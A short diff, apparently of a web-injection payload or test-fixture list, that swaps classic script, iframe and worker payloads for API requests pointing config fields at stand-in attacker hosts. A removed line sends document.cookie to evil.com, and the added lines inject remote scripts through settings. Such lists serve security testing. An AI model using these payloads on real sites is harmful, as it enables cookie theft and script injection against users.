@@ -1,4 +1,6 @@
-<script src="//attacker.com/evil.js"></script>
-<iframe src="https://evil.com"></iframe>
-fetch('https://evil.com/steal?c='+document.cookie)
-new Worker('https://evil.com/worker.js')
+PUT /api/config {"analytics":"//evil.com/track.js"}
+POST /api/settings {"cdn":"http://attacker.com/jquery.js"}
+PUT /api/theme {"stylesheet":"//evil.com/style.css"}
+POST /api/widget {"src":"//attacker.com/widget.js"}
+PUT /api/embed {"url":"http://evil.com/frame"}
+POST /api/page {"script":"//evil.com/inject.js"}
